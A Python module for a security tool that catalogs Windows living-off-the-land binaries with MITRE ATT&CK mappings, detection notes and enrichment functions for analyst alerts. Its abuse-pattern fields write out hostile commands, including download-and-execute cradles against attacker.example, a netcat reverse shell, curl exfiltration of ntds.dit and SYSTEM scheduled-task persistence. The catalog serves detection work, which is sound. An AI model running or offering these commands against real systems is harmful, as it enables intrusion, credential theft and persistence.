"""LOLBin behavioral catalog — per-binary attack descriptions for analyst enrichment.

Maps detected binary names to technique description, abuse patterns,
MITRE ATT&CK sub-technique, detection notes, and typical kill-chain stage.
All entries sourced from LOLBAS Project (lolbas-project.github.io) and MITRE ATT&CK.
Safe for direct display in analyst consoles and incident tickets.
"""
from __future__ import annotations
from typing import Any, Dict, List

LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
    "certutil": {
        "full_name": "certutil.exe",
        "mitre_sub_technique": "T1105",
        "mitre_technique_name": "Ingress Tool Transfer",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows certificate management utility present on every modern Windows installation. "
            "Abused via '-urlcache -split -f <URL>' to download arbitrary files from "
            "internet-accessible URLs, bypassing many proxy inspection policies because certutil "
            "is a signed Microsoft binary. Also used to decode base64 content via '-decode' "
            "for multi-stage payload delivery."
        ),
        "abuse_patterns": [
            "certutil -urlcache -split -f <url> <output>  # remote file download",
            "certutil -decode encoded.txt decoded.exe     # base64 decode",
            "certutil -encode binary.exe encoded.txt      # base64 encode for exfiltration",
        ],
        "detection_note": (
            "Parent process spawning certutil with '-urlcache' or '-decode' is a strong indicator. "
            "Monitor for network connections initiated by certutil.exe. Legitimate uses are limited "
            "to certificate store management by sysadmins."
        ),
        "kill_chain_stage": "delivery/execution",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "mshta": {
        "full_name": "mshta.exe",
        "mitre_sub_technique": "T1218.005",
        "mitre_technique_name": "System Binary Proxy Execution: Mshta",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Microsoft HTML Application host that executes HTA files containing VBScript or JScript. "
            "Abused to execute remote script payloads: 'mshta https://attacker.example/evil.hta'. "
            "Bypasses PowerShell execution policies and AppLocker rules targeting .ps1 files. "
            "Frequently used as the second stage after a phishing email attachment is opened."
        ),
        "abuse_patterns": [
            "mshta https://<attacker>/payload.hta                       # remote HTA execution",
            "mshta vbscript:Execute(\"CreateObject...\")(Window.Close)  # in-memory execution",
        ],
        "detection_note": (
            "mshta.exe making outbound HTTP/HTTPS connections is almost always malicious. "
            "Legitimate administrator use of mshta is extremely rare in modern environments."
        ),
        "kill_chain_stage": "execution",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "rundll32": {
        "full_name": "rundll32.exe",
        "mitre_sub_technique": "T1218.011",
        "mitre_technique_name": "System Binary Proxy Execution: Rundll32",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows DLL execution host abused to run JavaScript via 'rundll32 javascript:...' "
            "or to load arbitrary DLLs including remotely fetched ones. "
            "The 'rundll32 javascript:\"..\\mshtml,RunHTMLApplication\"' variant executes "
            "script directly in-memory without touching disk — classic fileless technique."
        ),
        "abuse_patterns": [
            "rundll32 javascript:\"..\\mshtml,RunHTMLApplication\";...  # in-memory JS execution",
            "rundll32 shell32.dll,ShellExec_RunDLL <payload>             # shell execution proxy",
        ],
        "detection_note": (
            "rundll32 invocations with 'javascript:' in the command line are a critical-severity "
            "indicator. Correlate with parent process and network connections."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "bitsadmin": {
        "full_name": "bitsadmin.exe",
        "mitre_sub_technique": "T1197",
        "mitre_technique_name": "BITS Jobs",
        "pasta_stage": "Stage3",
        "pasta_stage_name": "Stage3 — Application Decomposition & Threat Analysis",
        "description": (
            "Windows Background Intelligent Transfer Service administrator tool. Creates persistent "
            "BITS jobs that survive reboots and download files asynchronously in the background, "
            "evading real-time network monitoring. BITS jobs are re-executed on reboot automatically, "
            "providing a persistence mechanism."
        ),
        "abuse_patterns": [
            "bitsadmin /transfer job /download /priority normal <url> <dest>",
            "bitsadmin /create malicious; /addfile; /resume; /complete   # multi-step persistence",
        ],
        "detection_note": (
            "BITS jobs created by non-OS processes are anomalous. "
            "Check the BITS scheduled task queue and network connections from svchost."
        ),
        "kill_chain_stage": "persistence/delivery",
        "severity_weight": 0.75,
        "decode_path": "lolbin_command_decode",
    },
    "regsvr32": {
        "full_name": "regsvr32.exe",
        "mitre_sub_technique": "T1218.010",
        "mitre_technique_name": "System Binary Proxy Execution: Regsvr32",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "COM server registration utility. The 'Squiblydoo' technique uses "
            "'regsvr32 /s /n /u /i:<URL> scrobj.dll' to fetch and execute remote COM scriptlets "
            "over HTTP(S), bypassing AppLocker and application control policies. "
            "No child process is spawned — shellcode runs in the regsvr32 process context."
        ),
        "abuse_patterns": [
            "regsvr32 /s /n /u /i:https://<attacker>/payload.sct scrobj.dll  # Squiblydoo",
        ],
        "detection_note": (
            "regsvr32.exe network connections or loading remote SCT files is always malicious. "
            "Block regsvr32 from making outbound network calls via Windows Firewall rules."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "powershell": {
        "full_name": "powershell.exe",
        "mitre_sub_technique": "T1059.001",
        "mitre_technique_name": "Command and Scripting Interpreter: PowerShell",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "The '-EncodedCommand' / '-enc' flag accepts a Base64-encoded command string, "
            "commonly used to obfuscate malicious payloads and bypass script-based security "
            "controls. In-memory execution via 'Invoke-Expression' and 'IEX' leaves no script "
            "file on disk (fileless). '-WindowStyle Hidden' suppresses the console window to "
            "avoid detection by the user."
        ),
        "abuse_patterns": [
            "powershell -enc <base64>                              # encoded command obfuscation",
            "powershell -w hidden -enc <base64>                    # hidden window + encoding",
            "IEX (New-Object Net.WebClient).DownloadString(...)    # fileless download-execute",
        ],
        "detection_note": (
            "Base64-encoded PowerShell without a legitimate admin context is a high-severity "
            "indicator. Enable PowerShell Script Block Logging (Event ID 4104) and Transcript "
            "Logging to capture decoded commands before execution."
        ),
        "kill_chain_stage": "execution/c2",
        "severity_weight": 0.82,
        "decode_path": "lolbin_command_decode",
    },
    "schtasks": {
        "full_name": "schtasks.exe",
        "mitre_sub_technique": "T1053.005",
        "mitre_technique_name": "Scheduled Task/Job: Scheduled Task",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows task scheduler command-line utility. Used by attackers to create persistent "
            "scheduled tasks that survive reboots and execute malicious payloads at regular "
            "intervals. Tasks created with '/ru SYSTEM' escalate privileges. "
            "Tasks named after legitimate Microsoft services (e.g., MicrosoftEdgeUpdateTask) "
            "blend into normal system activity."
        ),
        "abuse_patterns": [
            "schtasks /create /tn <task> /tr <payload> /sc minute /mo 30 /ru SYSTEM /f",
            "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr powershell.exe /sc onlogon",
        ],
        "detection_note": (
            "Scheduled task creation by non-OS processes, especially with '/ru SYSTEM' or "
            "short intervals (/sc minute), is a high-severity persistence indicator. "
            "Audit Windows Event ID 4698 (task created) and 4702 (task updated)."
        ),
        "kill_chain_stage": "persistence",
        "severity_weight": 0.75,
        "decode_path": "lolbin_command_decode",
    },
    "wmic": {
        "full_name": "wmic.exe",
        "mitre_sub_technique": "T1047",
        "mitre_technique_name": "Windows Management Instrumentation",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Management Instrumentation command-line interface. Used for remote process "
            "execution ('wmic /node: process call create'), persistence via WMI event subscriptions "
            "(T1546.003), and lateral movement. WMI subscriptions survive reboots and run without "
            "spawning a visible child process — a classic fileless persistence technique."
        ),
        "abuse_patterns": [
            "wmic process call create \"powershell.exe -enc <payload>\"",
            "wmic /node:<remote> process call create \"cmd.exe /c <command>\"",
        ],
        "detection_note": (
            "wmic.exe invocations with 'process call create' or connections to remote nodes are "
            "high-severity indicators. WMI event subscriptions should be audited via "
            "Get-WMIObject -Namespace root\\subscription -Class __EventFilter."
        ),
        "kill_chain_stage": "execution/lateral_movement",
        "severity_weight": 0.78,
        "decode_path": "lolbin_command_decode",
    },
    "msiexec": {
        "full_name": "msiexec.exe",
        "mitre_sub_technique": "T1218.007",
        "mitre_technique_name": "System Binary Proxy Execution: Msiexec",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Installer executable. Can fetch and execute remote MSI packages "
            "('/i https://attacker.example/payload.msi /q'), bypassing application "
            "control policies that trust signed Microsoft binaries. The '/q' flag "
            "runs silently with no user interface."
        ),
        "abuse_patterns": [
            "msiexec /i https://<attacker>/payload.msi /q          # silent remote MSI install",
            "msiexec /y <dll>                                        # DLL registration proxy",
        ],
        "detection_note": (
            "msiexec.exe making outbound HTTPS connections or loading MSI from a UNC/HTTP path "
            "is almost always malicious. Monitor for msiexec child processes and network connections."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.77,
        "decode_path": "lolbin_command_decode",
    },
    "forfiles": {
        "full_name": "forfiles.exe",
        "mitre_sub_technique": "T1202",
        "mitre_technique_name": "Indirect Command Execution",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows file iterator that can execute arbitrary commands via '/c'. "
            "Used as a cmd.exe proxy to bypass application control: "
            "'forfiles /p C:\\Windows\\System32 /m cmd.exe /c \"cmd /c <payload>\"'. "
            "Less commonly detected than direct cmd.exe invocations."
        ),
        "abuse_patterns": [
            "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c powershell.exe -enc <b64>\"",
        ],
        "detection_note": (
            "forfiles.exe with '/c' executing non-file-management commands is anomalous. "
            "Flag forfiles spawning powershell, cmd, or network-connected processes."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.65,
        "decode_path": "lolbin_command_decode",
    },
    "wscript": {
        "full_name": "wscript.exe",
        "mitre_sub_technique": "T1059.005",
        "mitre_technique_name": "Command and Scripting Interpreter: Visual Basic",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Script Host — executes VBScript (.vbs) and JScript (.js) files. "
            "Frequently used as the initial execution stage after a phishing attachment is "
            "double-clicked. 'wscript /b' runs silently (batch mode) with no console window. "
            "Commonly spawned by Office macros via CreateObject('WScript.Shell')."
        ),
        "abuse_patterns": [
            "wscript.exe /b payload.vbs                             # silent VBS execution",
            "wscript.exe //E:jscript payload.txt                    # JScript via renamed file",
        ],
        "detection_note": (
            "wscript.exe spawned by WINWORD.EXE, EXCEL.EXE, or OUTLOOK.EXE is a "
            "critical-severity Office-to-script-host indicator. Monitor Event ID 4688."
        ),
        "kill_chain_stage": "execution",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "cscript": {
        "full_name": "cscript.exe",
        "mitre_sub_technique": "T1059.005",
        "mitre_technique_name": "Command and Scripting Interpreter: Visual Basic",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Script Host console variant — executes VBScript and JScript from the "
            "command line with console output. Often used interchangeably with wscript.exe "
            "in attack chains. Spawning cscript from an Office process is a strong indicator."
        ),
        "abuse_patterns": [
            "cscript.exe payload.vbs                                # console VBS execution",
            "cscript.exe //E:jscript //nologo payload.js            # JScript silent execution",
        ],
        "detection_note": (
            "Same detection logic as wscript.exe. Correlate with parent process — "
            "Office applications spawning cscript.exe is a confirmed macro execution indicator."
        ),
        "kill_chain_stage": "execution",
        "severity_weight": 0.78,
        "decode_path": "lolbin_command_decode",
    },
    # ── Windows 11-era additions ─────────────────────────────────────────────
    "wsl": {
        "full_name": "wsl.exe",
        "mitre_sub_technique": "T1202",
        "mitre_technique_name": "Indirect Command Execution via WSL",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Subsystem for Linux host binary, present on all Windows 11 systems with WSL enabled. "
            "Abused to execute Linux binaries and shell commands that evade Windows-native EDR by "
            "running inside the WSL filesystem namespace: 'wsl -e /bin/bash -c <command>'. "
            "Provides access to curl, wget, nc, python3, and other Linux tools that are harder to monitor "
            "than their Windows counterparts."
        ),
        "abuse_patterns": [
            "wsl -e /bin/bash -c 'curl http://attacker/payload -o /tmp/p; chmod +x /tmp/p; /tmp/p'",
            "wsl -e python3 -c \"import socket; ...\"  # in-process C2 via Linux Python",
            "wsl --exec nc -e /bin/sh <ip> <port>       # reverse shell via netcat",
        ],
        "detection_note": (
            "wsl.exe spawning bash with network-related child processes (curl, wget, nc) is a critical indicator. "
            "Monitor wsl.exe child process tree and WSL network connections. "
            "Legitimate WSL use rarely involves network tools called from parent processes."
        ),
        "kill_chain_stage": "execution/lateral_movement",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "winget": {
        "full_name": "winget.exe",
        "mitre_sub_technique": "T1072",
        "mitre_technique_name": "Software Deployment Tools Abuse",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows Package Manager, built into Windows 11. Can be abused to install attacker-controlled "
            "packages or download legitimate remote administration tools: 'winget install <trojanized-pkg>'. "
            "Can also download and execute portable apps outside traditional installer flows."
        ),
        "abuse_patterns": [
            "winget install --id Publisher.App --silent --accept-source-agreements",
            "winget install -e --id AnyDesk.AnyDesk --silent  # stealth RAT install",
        ],
        "detection_note": (
            "winget.exe spawned from non-admin user sessions, scheduled tasks, or scripts is suspicious. "
            "Monitor winget.exe network connections and installed packages post-execution."
        ),
        "kill_chain_stage": "installation",
        "severity_weight": 0.65,
        "decode_path": "lolbin_command_decode",
    },
    "curl": {
        "full_name": "curl.exe",
        "mitre_sub_technique": "T1105",
        "mitre_technique_name": "Ingress Tool Transfer via Built-in curl",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "curl.exe is built into Windows 11 (since 2021) and can transfer files using HTTP/S, FTP, "
            "and other protocols. Abused as a download cradle: 'curl -o malware.exe http://attacker/payload'. "
            "Signed by Microsoft, so it bypasses application control policies that only check signatures."
        ),
        "abuse_patterns": [
            "curl -sL https://attacker.example/stage2.exe -o %TEMP%\\s.exe && start %TEMP%\\s.exe",
            "curl -X POST https://attacker.example/exfil -d @c:\\users\\admin\\ntds.dit",
        ],
        "detection_note": (
            "curl.exe network connections to non-CDN / private IPs are suspicious. "
            "Look for curl followed by file execution or scheduled task creation."
        ),
        "kill_chain_stage": "delivery/exfiltration",
        "severity_weight": 0.75,
        "decode_path": "lolbin_command_decode",
    },
    "desktopimgdownldr": {
        "full_name": "desktopimgdownldr.exe",
        "mitre_sub_technique": "T1105",
        "mitre_technique_name": "Ingress Tool Transfer via Wallpaper Downloader",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows wallpaper downloader utility abused by setting SYSTEMROOT environment variable "
            "to redirect downloads to attacker-controlled URLs. "
            "'desktopimgdownldr /lockscreenurl:https://attacker/payload.exe /eventguid:...' "
            "downloads the payload disguised as a lock-screen image."
        ),
        "abuse_patterns": [
            "desktopimgdownldr /lockscreenurl:https://attacker.example/payload.exe /eventguid:{GUID}",
        ],
        "detection_note": (
            "desktopimgdownldr.exe with non-Microsoft URLs in /lockscreenurl parameter is a strong indicator. "
            "This binary has no legitimate non-wallpaper use case."
        ),
        "kill_chain_stage": "delivery",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "ftp": {
        "full_name": "ftp.exe",
        "mitre_sub_technique": "T1105",
        "mitre_technique_name": "Ingress Tool Transfer via Built-in FTP",
        "pasta_stage": "Stage4",
        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
        "description": (
            "Windows built-in FTP client present on all Windows versions. "
            "Abused for file download via command file: ftp -s:commands.txt where commands.txt contains "
            "GET payload.exe. Also used as a data exfiltration channel bypassing HTTP inspection."
        ),
        "abuse_patterns": [
            "echo open attacker.example> ftp.txt && echo GET payload.exe>> ftp.txt && ftp -s:ftp.txt",
        ],
        "detection_note": (
            "ftp.exe spawned from scripts, cmd, or powershell making outbound connections to non-corporate "
            "FTP servers is highly suspicious. Legitimate FTP use from endpoints is extremely rare."
        ),
        "kill_chain_stage": "delivery/exfiltration",
        "severity_weight": 0.70,
        "decode_path": "lolbin_command_decode",
    },
}

_LOLBIN_ATTACK_BY_BINARY: Dict[str, List[str]] = {
    "certutil": ["T1105"],
    "bitsadmin": ["T1197"],
    "mshta": ["T1218.005"],
    "regsvr32": ["T1218.010"],
    "rundll32": ["T1218.011"],
    "wscript": ["T1059.005"],
    "cscript": ["T1059.005"],
    "powershell": ["T1059.001"],
    "schtasks": ["T1053.005"],
    "wmic": ["T1047"],
    "msiexec": ["T1218.007"],
    "forfiles": ["T1202"],
    "cmd": ["T1059.003"],
    # Windows 11-era additions
    "wsl": ["T1202", "T1059.004"],
    "winget": ["T1072"],
    "curl": ["T1105", "T1041"],
    "desktopimgdownldr": ["T1105"],
    "ftp": ["T1105", "T1041"],
}


def enrich_lolbin_indicators(lolbin_hits: List[str]) -> List[Dict[str, Any]]:
    """Return per-binary behavioral profiles for a list of detected LOLBin names.

    Args:
        lolbin_hits: list of lowercase binary name strings from regex match groups,
                     e.g. ['certutil', 'powershell -enc']

    Returns:
        List of dicts, one per unique detected binary, each with full behavioral context
        including MITRE sub-technique, PASTA stage, abuse patterns, and detection notes.
    """
    out: List[Dict[str, Any]] = []
    seen: set[str] = set()
    for hit in lolbin_hits:
        key = str(hit or "").strip().lower()
        for catalog_key in LOLBIN_CATALOG:
            if key.startswith(catalog_key) and catalog_key not in seen:
                seen.add(catalog_key)
                entry = dict(LOLBIN_CATALOG[catalog_key])
                entry["detected_as"] = hit
                out.append(entry)
                break
    return out


def canonical_attack_ids_for_binary(binary: str, command_text: str | None = None) -> List[str]:
    name = str(binary or "").strip().lower().replace(".exe", "")
    command = str(command_text or "").strip().lower()
    out = list(_LOLBIN_ATTACK_BY_BINARY.get(name, []))
    if name == "certutil" and any(tok in command for tok in ("-decode", " decode ", "frombase64string")):
        out.append("T1140")
    seen: set[str] = set()
    return [x for x in out if x and not (x in seen or seen.add(x))]


def derive_lolbin_attack_ids_from_text(content_text: str) -> List[str]:
    lowered = str(content_text or "").lower()
    found: List[str] = []
    for key in LOLBIN_CATALOG:
        if key in lowered:
            found.extend(canonical_attack_ids_for_binary(key, lowered))
    seen: set[str] = set()
    return [x for x in found if x and not (x in seen or seen.add(x))]
